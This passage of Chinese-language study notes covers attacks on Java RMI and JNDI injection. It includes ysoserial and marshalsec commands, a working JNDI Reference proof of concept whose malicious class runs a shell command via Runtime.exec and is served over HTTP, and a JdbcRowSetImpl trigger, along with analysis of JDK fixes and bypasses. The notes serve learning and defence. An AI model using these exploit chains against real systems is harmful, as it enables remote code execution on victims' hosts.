RemoteHelloWorld remoteHelloWorld = (RemoteHelloWorld) Naming.lookup("rmi://127.0.0.1:1099/Hello");
remoteHelloWorld.test1();
```

#### 注册中心攻击客户端

ysoserial 生成恶意注册中心

```
java8 -cp .\ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections6 "calc.exe"
```

client端调用注册中心的任意方法，接口反序列化。

## 局限

以上几种方法都需要 registry、server、client 本地有对应的 gadget 依赖，有一定的局限性。

可以利用 Reference 对象，

![image-20220220111521180](img/image-20220220111521180.png)![image-20220220111521180](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220220111521180.png?lastModify=1646033842)

client会自动从 http://localhost/ 远程获取 class 字节码，从而造成针对 client 的攻击**，但是这种方法在 8u121 之后默认失效。**

**8u121 之后会有反序列化白名单限制，且默认无法通过 Reference 加载远程字节码。**

但是是有方法绕过的。

## JEP290 基本概念

`JEP290`的描述是`Filter Incoming Serialization Data`，即过滤传入的序列化数据。

JEP290 `是 Java 为了防御反序列化攻击而设置的一种过滤器，其在 JEP 项目中编号为290，因而通常被简称为`JEP290。

具体内容：

1、限制的情况：

- 反序列化类数组时的数组元素数 ( [arrayLength](https://docs.oracle.com/javase/9/docs/api/java/io/ObjectInputFilter.FilterInfo.html#arrayLength--) )
- 每个嵌套对象的[深度](https://docs.oracle.com/javase/9/docs/api/java/io/ObjectInputFilter.FilterInfo.html#depth--)( [depth](https://docs.oracle.com/javase/9/docs/api/java/io/ObjectInputFilter.FilterInfo.html#depth--) )
- 当前数量对象引用 ( [references](https://docs.oracle.com/javase/9/docs/api/java/io/ObjectInputFilter.FilterInfo.html#references--) ) 的数量
- 当前消耗的字节数 ( [streamBytes](https://docs.oracle.com/javase/9/docs/api/java/io/ObjectInputFilter.FilterInfo.html#streamBytes--) )

2、支持 3 种配置过滤器的方式

- 自定义过滤器
- 进程范围过滤器（也称为全局过滤器）
- 用于 RMI 注册表和分布式垃圾收集 (DGC)使用的内置过滤器

3、自定义过滤器

当反序列化要求与整个应用程序中的任何其他反序列化过程不同时，就会出现自定义过滤器的配置场景；可以通过实现`ObjectInputFilter`接口并覆盖`checkInput(FilterInfo filterInfo)`方法来创建自定义过滤器：



https://www.cnpanda.net/sec/968.html

## jndi

RMI服务端在绑定远程对象至注册中心时，不只是可以绑定RMI服务器本身上的对象，还可以使用Reference对象指定一个托管在第三方服务器上的class文件，再绑定给注册中心。 在客户端处理服务端返回数据时，发现是一个Reference对象，就会动态加载这个对象中的类。 攻击者只要能够

1. 控制RMI客户端去调用指定RMI服务器
2. 在可控RMI服务器上绑定Reference对象，Reference对象指定远程恶意类
3. 远程恶意类文件的构造方法、静态代码块、getObjectInstance()方法等处写入恶意代码

就可以达到RCE的效果。fasjson组件漏洞rmi、ldap的利用形式正是使用lndi注入，而不是有关RMI反序列化。

## 针对 RMI 服务的九重攻击-上

来自： https://xz.aliyun.com/t/7930

![20200701101308-6810e0aa-bb40-1](img/20200701101308-6810e0aa-bb40-1-16453275287412.png)![20200701101308-6810e0aa-bb40-1](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/20200701101308-6810e0aa-bb40-1-16453275287412.png?lastModify=1646033842)

四个方向：

1. 探测利用开放的 RMI 服务
2. 基于 RMI 服务反序列化过程的攻击
3. 利用 RMI 的动态加载特性的攻击利用
4. 结合 JNDI 注入

#### 探测利用开放的RMI服务

使用工具[BaRMIe](https://github.com/NickstaDB/BaRMIe)去寻找可受攻击的RMI服务

![image-20220220114453333](img/image-20220220114453333.png)![image-20220220114453333](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220220114453333.png?lastModify=1646033842)

![image-20220220113706704](img/image-20220220113706704.png)![image-20220220113706704](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220220113706704.png?lastModify=1646033842)

![image-20220220113756089](img/image-20220220113756089.png)![image-20220220113756089](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220220113756089.png?lastModify=1646033842)

实际上要调用一个存在危险功能的 RMI 服务端需要知道： RMI对象a、方法b、参数c，即 `a.b(c)` 。

但是如果不知道注册端和服务端的情况下，客户端就不知道有哪些方法可以调用可以利用，我们不知道方法和参数。

##### BaRMIe enum模式

https://github.com/NickstaDB/BaRMIe

来看 BaRMIe 工具怎么做到：

提供了两种利用模式：

- enum 模式
- attack 模式

调试一波

![image-20220220135752847](img/image-20220220135752847.png)![image-20220220135752847](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220220135752847.png?lastModify=1646033842)

![image-20220220135819634](img/image-20220220135819634.png)![image-20220220135819634](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220220135819634.png?lastModify=1646033842)

下断点，复制图中的命令行参数，运行工具

```
java8 -agentlib:jdwp=transport=dt_socket,server=n,address=DESKTOP-CRQ2AAT:5005,suspend=y -jar .\BaRMIe_v1.01.jar -enum 127.0.0.1 1099
```

就可以调试了。

**enum枚举模式**，入口在`nb.barmie.modes.enumeration.EnumerationTask#run`。

第一步，跟进

```
// 枚举端点
ep = this._enumerator.enumerateEndpoint(this._target);
```

![image-20220220140053826](img/image-20220220140053826.png)![image-20220220140053826](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220220140053826.png?lastModify=1646033842)

参数为启动工具时指定的 `127.0.0.1:1099`

1. `LocateRegistry.getRegistry`获取目标IP端口的RMI注册端
2. `reg.list();` 获取注册端上所有服务端的 Endpoint 对象
3. `reg.unbind(unbindName);` 解绑一个不存在的 RMI 服务名，根据报错信息来判断我们当前 IP 是否可以操作该 RMI 注册端 （如果可以操控，意味着我们可以解绑任意已经存在RMI服务，但是这只是破坏，没有太大的意义，就算bind一个恶意的服务上去，调用它，也是在我们自己的机器上运行而不是RMI服务端）
4. 本地起一个代理用的 RMI 注册端，用于转发我们对于目标 RMI 注册端的请求（在 BaRMIe 中，通过这层代理用注册端可以变量成 payload ，算是一层封装，在这里用于接收原始回应数据，在跟进解析）
5. 通过代理服务器`reg.lookup(objectNames[i]);`  遍历之前获取的所有服务端的 Endpoint
6. 通过代理服务器得到 lookup 返回的源数据，自行解析获取对应对象相应的类细节（因为直接让他自动解析是不会有响应的类信息的）

![image-20220220141539741](img/image-20220220141539741-16453377405043.png)![image-20220220141539741](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220220141539741-16453377405043.png?lastModify=1646033842)

`if(ep.isRegistry())` 和 `ep.isRemotelyModifiable()` 判断输出

![image-20220220141821962](img/image-20220220141821962.png)![image-20220220141821962](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220220141821962.png?lastModify=1646033842)

如果这些信息都获取成功，就会判定为这个端口是一个注册端，否则觉得这个不是注册端，输出

![image-20220220142052496](img/image-20220220142052496.png)![image-20220220142052496](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220220142052496.png?lastModify=1646033842)

第二步： `attacks = RMIAttackFactory.findAttacksForEndpoint(ep);`

对于所有的 Endpoint （RMI 服务端）进行遍历，再一一调用攻击模块判断是否可以攻击。

![image-20220220142312805](img/image-20220220142312805.png)![image-20220220142312805](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220220142312805.png?lastModify=1646033842)

RMIAttackFactory 类静态代码块里将 attacks 模块添加到变量，

![image-20220220142517664](img/image-20220220142517664.png)![image-20220220142517664](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220220142517664.png?lastModify=1646033842)

在`findAttacksForEndpoint` 方法里，对每种方法进行测试，最后返回成功的方法，

![image-20220220142655044](img/image-20220220142655044.png)![image-20220220142655044](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220220142655044.png?lastModify=1646033842)

`if(attacks.size() > 0)` 后输出。

第三步： `deserPayloads = DeserPayloadFactory.findGadgetsForEndpoint(ep);`

对于所有 Endpoint （RMI服务端）进行遍历，尝试判断是否存在但序列化利用链。

![image-20220220143138343](img/image-20220220143138343.png)![image-20220220143138343](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220220143138343.png?lastModify=1646033842)

原理为判断路劲中是否有相关 jar 包

![image-20220220143251426](img/image-20220220143251426.png)![image-20220220143251426](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220220143251426.png?lastModify=1646033842)

**不靠谱，没检测到。**

#### BaRMIe 如何探测开放的 RMI 服务的攻击模块怎么实现

4个攻击模块Delete、List、Read、Write都是针对AxiomSL这个组件。看一个List的。

描述：AxiomSL公开一个对象FileBrowserStub，它有一个list files（）方法，该方法返回给定目录中的文件列表。

在判断是否存在漏洞时会去判断RMI服务返回的对象的class栈中是否存在以下class路径：

```
axiomsl.server.rmi.FileBrowserStub
```

判断存在该class路径后，再进行利用；实际利用代码也很简单，就是普通的RMI服务调用：

```
//nb.barmie.modes.attack.attacks.Axiom.ListFiles#executeAttack
public void executeAttack(RMIEndpoint ep) throws BaRMIeException {
        //一些参数设定    

        //用户输入一个想要列出的文件目录
        path = this.promptUserForInput("Enter a path to list files from: ", false);
        System.out.println("");

        //向eq（RMI服务端）lookup一个FileBrowserStub对象
        //同时本地也写好了FileBrowserStub接口
        System.out.println("[~] Getting fileBrowser object...");
        fbs = (FileBrowserStub)this.getRemoteObject(ep, "fileBrowser");

        //调用listFilesOnServer方法获取调用结果
        files = fbs.listFilesOnServer(path);

    }

/***********************************************************
 * FileBrowserStub for AxiomSL attacks.
 **********************************************************/
public abstract interface FileBrowserStub extends Remote {
    public abstract FileInformation[] listFilesOnServer(String paramString) throws RemoteException;
    public abstract byte[] readFile(String paramString, long paramLong, int paramInt) throws IOException;
    public abstract void writeFile(String paramString, byte[] paramArrayOfByte) throws IOException;
    public abstract boolean deleteFile(String paramString, boolean paramBoolean) throws RemoteException;
    public abstract FileInformation getFileInformation(String paramString) throws RemoteException;
}
```

那这边也就清楚了，实际上探测利用开放的RMI服务，根本只是攻击者自己知道有哪些组件会提供危险的RMI服务。然后根据class路径去判断对面是否使用了该组件，如果用了就尝试打一打看看成不成功。

假如对面提供了我们一个不认识的RMI服务，我们是没有能力攻击的。

就如之前提到的一样：因为我们没有RMI服务对象的接口（方法+参数）。就算对面开放了一个Class名字可疑的服务，我们也没有办法去正确调用它。

可见这种理论存在但是不怎么被人讨论的攻击方法总是有些鸡肋。

#### BaRMIe attack 攻击模式

直接看这里吧： https://xz.aliyun.com/t/7930

关键点：

> 3.通过非法的方法调用进行反序列化攻击
>
> 由于在服务器上对于客户端传入参数序列化的同时对于方法的参数并没有进行匹配检查。我们可以使用具有非原始参数类型的任何方法作为反序列化攻击的入口点。BaRMIe通过使用TCP代理在网络级别修改方法参数来实现这一点，实际上触发了非法的方法调用。下面是一些易受攻击方法的示例：
>
> ```
> public void setName(String name);
> public Long add(Integer i1, Integer i2);
> public void sum(int[] values);
> ```
>
> 当方法调用通过代理时，这些方法的参数可以替换为反序列化负载。此攻击是可能的，因为Java在反序列化之前不会尝试验证通过网络接收的远程方法参数是否与实际参数类型兼容。

这个绕过其实在实际场景中也同样有一个鸡肋的前提，客户端要知道服务端起服务的接口以及调用方式，即a.b(c)。

实际利用还是太难了。

#### RMI服务端反序列化攻击RMI注册端

记录一下之前遇到的问题，文章中正好有解释

> 环境：RMI-Server ServerAndRegister 分析
>
> jdk:1.7u80
>
> jdk7u80版本这个地方在调试`RegistryImpl_Skel.class`这个神奇的文件的时候有一个非常有趣而坑爹的情况，那就是这个class压根没法调试。百思不得其解，去下了openjdk 的jdk源码，发现源码中根本没有这个`RegistryImpl_Skel.java`文件。
>
> 跟wh1tp1g讨论了下，应该是一个动态生成的class，所以不能调试。然后非常神奇在jdk8版本的8u112也不能调试，但是8u141之后又可以了。如果有想自己调试的同学可以注意下这个点。

到之后看不懂了.....先放下链接：

https://xz.aliyun.com/t/7930

https://xz.aliyun.com/t/7932





































































https://xz.aliyun.com/t/6660

https://xz.aliyun.com/t/7930

https://xz.aliyun.com/t/7932

Java安全漫谈 - 04.RMI篇.pdf

https://su18.org/post/rmi-attack



# JNDI

> JNDI（全称`Java Naming and Directory Interface`）是用于目录服务的Java  API，它允许Java客户端通过名称发现和查找数据和资源(以Java对象的形式)。与与主机系统接口的所有Java  api一样，JNDI独立于底层实现。此外，它指定了一个服务提供者接口(SPI)，该接口允许将目录服务实现插入到框架中。通过JNDI查询的信息可能由服务器、文件或数据库提供，选择取决于所使用的实现。

```
String jndiName = ...;  // 指定需要查找的name名称
Context context = new InitialContext(); // 初始化默认环境
DataSource ds = (DateSource)context.lookup(jndiName); // 查找该 name 的数据
```

这些对象可以存储在不同的命名或目录服务中，例如远程方法调用（RMI），通用对象请求代理体系结构（CORBA），轻型目录访问协议（LDAP）或域名服务（DNS）。

RMI格式：

```
InitialContext var1 = new InitialContext();
DataSource var2 = (DataSource)var1.lookup("rmi://127.0.0.1:1099/Exploit");
```

## JNDI注入原理及利用

如果代码中 jndiName 可控时，那么就可引发 远程class加载，从而导致代码执行。

#### RMI+JNDI Reference payload <JDK 1.8u191

> 和之前 RMI 命令执行的区别：
>
> 之前RMI 是在 服务端执行代码的，
>
> 现在jndi 是在 客户端。

通过RMI进行JNDI注入，攻击者构造的恶意RMI服务器向客户端返回一个`Reference`对象，`Reference`对象中指定从远程加载构造的恶意`Factory`类，客户端在进行`lookup`的时候，会从远程动态加载攻击者构造的恶意`Factory`类并实例化，攻击者可以在构造方法或者是静态代码等地方加入恶意代码。

`javax.naming.Reference`构造方法为：`Reference(String className, String factory, String factoryLocation)`，

1. `className` - 远程加载时所使用的类名
2. `classFactory` - 加载的`class`中需要实例化类的名称
3. `classFactoryLocation` - 提供`classes`数据的地址可以是`file/ftp/http`等协议

因为`Reference`没有实现`Remote`接口也没有继承`UnicastRemoteObject`类，故不能作为远程对象bind到注册中心，所以需要使用`ReferenceWrapper`对`Reference`的实例进行一个封装。

![image-20220221094025469](img/image-20220221094025469.png)![image-20220221094025469](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220221094025469.png?lastModify=1646033842)

Server.java

```
package jndi;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.NamingException;
import javax.naming.Reference;
import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class Server {
    public static void main(String[] args) throws RemoteException, NamingException, AlreadyBoundException {
        Registry registry = LocateRegistry.createRegistry(1099);
        Reference reference = new Reference("Exec", "Exec", "http://127.0.0.1:8000/");
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
        registry.bind("poc",referenceWrapper);
    }
}
```

client.java

```
package jndi;

import javax.naming.InitialContext;
import javax.naming.NamingException;

public class Client {
    public static void main(String[] args) throws NamingException {
        String uri = "rmi://127.0.0.1:1099/poc";
        InitialContext initialContext = new InitialContext();
        initialContext.lookup(uri);
    }
}
```

**客户端获取远程对象时，获得到一个 Reference 类的存根，由于获取的是一个`Reference`实例，客户端会首先去本地的 Classpath 去寻找被表示为 `Exec` 的类，如果本地未找到，则回去请求指定的 `http://127.0.0.1:8000/Exec.class` 动态加载 class 并调用 第二个参数 `Exec` 类的构造函数。**

Exec.java

```
import java.io.*;

public class Exec {
    public Exec() throws IOException, InterruptedException {
        Process process = Runtime.getRuntime().exec("whoami");
        printMessage(process.getInputStream());
        printMessage(process.getErrorStream());
        System.out.println(process.waitFor());
    }

    private static void printMessage(InputStream inputStream) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                Reader reader = new InputStreamReader(inputStream);
                BufferedReader bufferedReader = new BufferedReader(reader);
                String line = null;
                try {
                    while ((line = bufferedReader.readLine()) != null) {
                        System.out.println(line);
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }).start();
    }
}
```

编译 `Exec.java` ,然后启动 http 服务

```
javac Exec.java
 
python3 -m http.server 8888
```

> 把ExecTest.java及其编译的文件放到其他目录下，不然会在当前目录中直接找到这个类。不起web服务也会命令执行成功。 ExecTest.java文件不能申明包名，即package xxx。声明后编译的class文件函数名称会加上包名从而不匹配。

启动 server, 

启动client ,发现报错了

```
Exception in thread "main" javax.naming.ConfigurationException: The object factory is untrusted. Set the system property 'com.sun.jndi.rmi.object.trustURLCodebase' to 'true'.
```

**原因: java 版本1.8u191 之后版本存在 `trustCodebaseURL`的限制，只信任已有的 codebase 地址，不能再能够指定 codebase 中下载字节码。**

所以我们把 jdk 调成小于 1.8u191 。

![image-20220123173509555](img/image-20220123173509555.png)![image-20220123173509555](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220123173509555.png?lastModify=1646033842)

#### 分析

调用栈

![image-20220123173758140](img/image-20220123173758140.png)![image-20220123173758140](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220123173758140.png?lastModify=1646033842)

```
InitialContext#lookup
public Object lookup(String name) throws NamingException {
    // getURLOrDefaultInitCtx函数会分析name的协议头返回对应协议的环境对象，此处返回Context对象的子类rmiURLContext对象
    // 然后在对应协议中去lookup搜索，我们进入lookup函数
    return getURLOrDefaultInitCtx(name).lookup(name);
}
GenericURLContext#lookup
// var1 = "rmi://127.0.0.1:1099/poc"
public Object lookup(String var1) throws NamingException {
    //此处this为rmiURLContext类调用对应类的getRootURLContext类为解析RMI地址
    //不同协议调用这个函数，根据之前getURLOrDefaultInitCtx(name)返回对象的类型不同，执行不同的getRootURLContext
    //进入不同的协议路线
    ResolveResult var2 = this.getRootURLContext(var1, this.myEnv);    // 获取 RMI 注册中心相关数据
    Context var3 = (Context)var2.getResolvedObj(); // 获取注册中心对象

    Object var4;
    try {
        var4 = var3.lookup(var2.getRemainingName()); // 去注册中心调用 lookup 查找，进入此处，传入 name - poc
    } finally {
        var3.close();
    }

    return var4;
}
```

`RegistryContext#lookup`：

```
// 传入 var1 = poc
public Object lookup(Name var1) throws NamingException {
    if (var1.isEmpty()) {
        return new RegistryContext(this);
    } else {
        Remote var2;
        try {
            var2 = this.registry.lookup(var1.get(0)); // RMI客户端与注册中心通讯，返回RMI服务 IP,地址等信息
        } catch (NotBoundException var4) {
            throw new NameNotFoundException(var1.get(0));
        } catch (RemoteException var5) {
            throw (NamingException)wrapRemoteException(var5).fillInStackTrace();
        }

        return this.decodeObject(var2, var1.getPrefix(1));   // 进入此处
    }
}
```

`RegistryContext#decodeObject`：

```
private Object decodeObject(Remote var1, Name var2) throws NamingException {
    try {
         //注意到上面的服务端代码，我们在RMI服务端绑定的是一个Reference对象，世界线在这里变动
            //如果是Reference对象,会进入var.getReference()，与RMI服务器进行一次连接，获取到远程class文件地址。
            //如果是普通RMI对象服务，这里不会进行连接，只有在正式远程函数调用的时候才会连接RMI服务。
        Object var3 = var1 instanceof RemoteReference ? ((RemoteReference)var1).getReference() : var1;
        return NamingManager.getObjectInstance(var3, var2, this, this.environment);  //获取reference对象进入此处
    } catch (NamingException var5) {
        throw var5;
    } catch (RemoteException var6) {
        throw (NamingException)wrapRemoteException(var6).fillInStackTrace();
    } catch (Exception var7) {
        NamingException var4 = new NamingException();
        var4.setRootCause(var7);
        throw var4;
    }
}
}
```

`NamingManager#getObjectInstance` :

```
// 传入 Reference 对象到 refinfo
public static Object
    getObjectInstance(Object refInfo, Name name, Context nameCtx,
                      Hashtable<?,?> environment)
    throws Exception
{

    ObjectFactory factory;

    // Use builder if installed
    ObjectFactoryBuilder builder = getObjectFactoryBuilder();
    if (builder != null) {
        // builder must return non-null factory
        factory = builder.createObjectFactory(refInfo, environment);
        return factory.getObjectInstance(refInfo, name, nameCtx,
                                         environment);
    }

    // Use reference if possible
    Reference ref = null;
    if (refInfo instanceof Reference) {  // 满足
        ref = (Reference) refInfo;  // 复制
    } else if (refInfo instanceof Referenceable) {
        ref = ((Referenceable)(refInfo)).getReference();
    }

    Object answer;

    if (ref != null) {    // 进入
        String f = ref.getFactoryClassName(); // 函数名 Exec
        if (f != null) {   // 进入
            // if reference identifies a factory, use exclusively
			// 任意命令执行点1(构造函数、静态代码)，进入此处
            factory = getObjectFactoryFromReference(ref, f);
            if (factory != null) {
                // 任意命令执行点2：复写getObjectInstance
                return factory.getObjectInstance(ref, name, nameCtx,
                                                 environment);
            }
            // No factory found, so return original refInfo.
            // Will reach this point if factory class is not in
            // class path and reference does not contain a URL for it
            return refInfo;

        } else {
            // if reference has no factory, check for addresses
            // containing URLs

            answer = processURLAddrs(ref, name, nameCtx, environment);
            if (answer != null) {
                return answer;
            }
        }
    }

    // try using any specified factories
    answer =
        createObjectFromFactories(refInfo, name, nameCtx, environment);
    return (answer != null) ? answer : refInfo;
}
```

`NamingManager#getObjectFactoryFromReference` :

```
static ObjectFactory getObjectFactoryFromReference(
    Reference ref, String factoryName)
    throws IllegalAccessException,
InstantiationException,
MalformedURLException {
    Class clas = null;
	// 尝试从本地获取 class
    // Try to use current class loader
    try {
        clas = helper.loadClass(factoryName);
    } catch (ClassNotFoundException e) {
        // ignore and continue
        // e.printStackTrace();
    }
    // All other exceptions are passed up.

    // Not in class path; try to use codebase
    // 如果不在本地，尝试从 codebase 获取 class
    String codebase;
    if (clas == null &&
        (codebase = ref.getFactoryClassLocation()) != null) {
        // 此处codebase 是我们在恶意 RMI服务端定义的 http://127.0.0.1:8000/
        try {
            // 从我们放置的恶意class文件的web服务器中获取class文件
            clas = helper.loadClass(factoryName, codebase);
        } catch (ClassNotFoundException e) {
        }
    }
	// 实例化恶意 class文件
    return (clas != null) ? (ObjectFactory) clas.newInstance() : null;
}
```

实例化会调用构造方法、静态方法块。

但是我们执行完命令后报错了，

修改恶意class文件，换一个命令执行点，`factory.getObjectInstance`复写该函数执行命令。

1. 报错是因为我们在类的实例化后不能转化为`ObjectFactory` ，只需要恶意类继承该类即可。

2. 根据`ObjectFactory` 的 `getObjectInstance`接口复写函数

   ```
   public Object getObjectInstance(Object obj, Name name, Context nameCtx,
                                   Hashtable<?,?> environment)
       throws Exception;
   ```

最终 Exec :

```
import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;
import java.io.*;
import java.util.Hashtable;

public class Exec implements ObjectFactory {

    private static void printMessage(final InputStream inputStream) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                Reader reader = new InputStreamReader(inputStream);
                BufferedReader bufferedReader = new BufferedReader(reader);
                String line = null;
                try {
                    while ((line = bufferedReader.readLine()) != null) {
                        System.out.println(line);
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }).start();
    }

    @Override
    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) throws Exception {
        Process process = Runtime.getRuntime().exec("whoami");
        printMessage(process.getInputStream());
        printMessage(process.getErrorStream());
        System.out.println(process.waitFor());
        return null;
    }
}
```

![image-20220123180054558](img/image-20220123180054558.png)![image-20220123180054558](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220123180054558.png?lastModify=1646033842)

#### 版本修复

来看看高版本为什么不可以利用

![image-20220221131056542](img/image-20220221131056542.png)![image-20220221131056542](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220221131056542.png?lastModify=1646033842)

这里增加了 if 判断，`trustURLCodebase` 默认为 false，其他条件也为 true，所以进入 if ，抛出异常

![image-20220221131453500](img/image-20220221131453500.png)![image-20220221131453500](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220221131453500.png?lastModify=1646033842)

![image-20220221131204875](img/image-20220221131204875.png)![image-20220221131204875](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220221131204875.png?lastModify=1646033842)

添加

```
System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
```

后，绕过了之前的 if，但是原本应该的 URLClassLoader 加载类，现在返回 null 了。

![image-20220221132910141](img/image-20220221132910141.png)![image-20220221132910141](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220221132910141.png?lastModify=1646033842)

![image-20220221132331520](img/image-20220221132331520.png)![image-20220221132331520](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220221132331520.png?lastModify=1646033842)

jdk 8u171 成功

![image-20220221135738673](img/image-20220221135738673.png)![image-20220221135738673](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220221135738673.png?lastModify=1646033842)

> **即使设置**System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase","true")为true后可以打到jdk8u181,191也不行了

#### 工具起rmi ldap服务

以上我们就成功复现了JNDI注入，但是常规使用中我们自己起RMI服务器太麻烦了，

可以使用工具[marshalsec](https://github.com/mbechler/marshalsec) 起服务，

使用`mvn clean package -DskipTests`编译。

```
#rmi服务器，rmi服务起在8088 恶意class在http://ip:8000/文件夹/#ExportObject 
#不加8088端口号 默认是1099
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://ip:8080/文件夹/#ExportObject 8088
```

![image-20220123180820988](img/image-20220123180820988.png)![image-20220123180820988](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220123180820988.png?lastModify=1646033842)

同时需要把 恶意 class文件的web服务需要自己开起来。

![image-20220123181041929](img/image-20220123181041929.png)![image-20220123181041929](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220123181041929.png?lastModify=1646033842)

#### com.sun.rowset.JdbcRowSetImpl 利用链

回到之前的攻击服务端，目前我们利用 jndi注入需要满足一定的条件，在以下代码中 uri 可控，

```
String uri = "rmi://127.0.0.1:8088/poc";
InitialContext initialContext = new InitialContext();
initialContext.lookup(uri);
```

并且存在漏洞版本的 java 环境，

我们先来扩展第一个代码限制的问题，就有点像在commons-collection反序列化一文寻找readobject复写点一样。

**com.sun.rowset.JdbcRowSetImpl**类: 是在fastjson反序列化漏洞中触发jndi注入的一环。

```
JdbcRowSetImpl#setAutoCommit
public void setAutoCommit(boolean var1) throws SQLException {
    if (this.conn != null) {
        this.conn.setAutoCommit(var1);
    } else {
        this.conn = this.connect();  // 进入此处
        this.conn.setAutoCommit(var1);
    }

}
JdbcRowSetImpl#connect
protected Connection connect() throws SQLException {
    if (this.conn != null) {
        return this.conn;
    } else if (this.getDataSourceName() != null) {
        // 需要一个可控的 getDataSourceName
        try {
            // 漏洞触发代码
            InitialContext var1 = new InitialContext();
            DataSource var2 = (DataSource)var1.lookup(this.getDataSourceName());  // 可控的 jndi 注入点
            return this.getUsername() != null && !this.getUsername().equals("") ? var2.getConnection(this.getUsername(), this.getPassword()) : var2.getConnection();
        } catch (NamingException var3) {
            throw new SQLException(this.resBundle.handleGetObject("jdbcrowsetimpl.connect").toString());
        }
    } else {
        return this.getUrl() != null ? DriverManager.getConnection(this.getUrl(), this.getUsername(), this.getPassword()) : null;
    }
}
```

最后需要**this.getDataSourceName()**的赋值处：

`JdbcRowSetImpl#setDataSourceName` :

```
public void setDataSourceName(String var1) throws SQLException {   // var 可控
    if (this.getDataSourceName() != null) {
        if (!this.getDataSourceName().equals(var1)) {
            String var2 = this.getDataSourceName();
            super.setDataSourceName(var1);
            this.conn = null;
            this.ps = null;
            this.rs = null;
            this.propertyChangeSupport.firePropertyChange("dataSourceName", var2, var1);
        }
    } else {
        super.setDataSourceName(var1);  // 赋值 setDataSourceName
        this.propertyChangeSupport.firePropertyChange("dataSourceName", (Object)null, var1);
    }
}
```

所以客户端 poc ：

```
package jndi;

import com.sun.rowset.JdbcRowSetImpl;

import java.sql.SQLException;

public class Client1 {
    public static void main(String[] args) throws SQLException {
        JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl();
        jdbcRowSet.setDataSourceName("rmi://127.0.0.1:8088/poc");
        jdbcRowSet.setAutoCommit(true);
    }
}
```

![image-20220123182712574](img/image-20220123182712574.png)![image-20220123182712574](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220123182712574.png?lastModify=1646033842)

> 至于该如何让jdbcRowSet执行在受害者机器上，那就是反序列化利用链一样地衍生了，这边只是衍生出第一步说明，JNDI注入并不是一定要存在一个web服务对外，一定要有一个`ctx.lookup(uri)`的url参数可控，才能形成漏洞。
>
> 漏洞利用要考虑java环境、组件，不要跟SQL注入一样认为都是定死的。具体就结合fastjson再议了。

#### RMI+LDAP注入java版本限制

代码问题解决了，但是还有个 版本限制问题，

JDNI注入由于其加载动态类原理是JNDI Reference远程加载Object Factory类的特性（使用的不是RMI Class Loading,而是URLClassLoader）。

jndi注入远程对象读取不单单只可以从rmi服务中读取，还可以从LDAP服务中读取。

LDAP服务的Reference远程加载Factory类**不受com.sun.jndi.rmi.object.trustURLCodebase、com.sun.jndi.cosnaming.object.trustURLCodebase等属性的限制**，所以适用范围更广。

不过在2018年10月，Java最终也修复了这个利用点，对LDAP Reference远程工厂类的加载增加了限制， 在Oracle JDK 11.0.1、8u191、7u201、6u211之后 **com.sun.jndi.ldap.object.trustURLCodebase 属性的默认值被调整为false**。

![img](img/006iKNp3ly1g89d6g04jvj317r0h70ua.jpg)![img](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/006iKNp3ly1g89d6g04jvj317r0h70ua.jpg?lastModify=1646033842)

#### LDAP+JNDI

> LDAP（Lightweight Directory Access Protocol）-轻量目录访问协议。

具有以下特点：

1. 基于TCP/IP协议

2. 同样也是分成服务端/客户端；同样也是服务端存储数据，客户端与服务端连接进行操作

3. 相对于mysql的表型存储；不同的是LDAP使用

   树型

   存储

   1. 因为树型存储，读性能佳，写性能差，没有事务处理、回滚功能。

树层次分为以下几层：

- dn：一条记录的详细位置，由以下几种属性组成
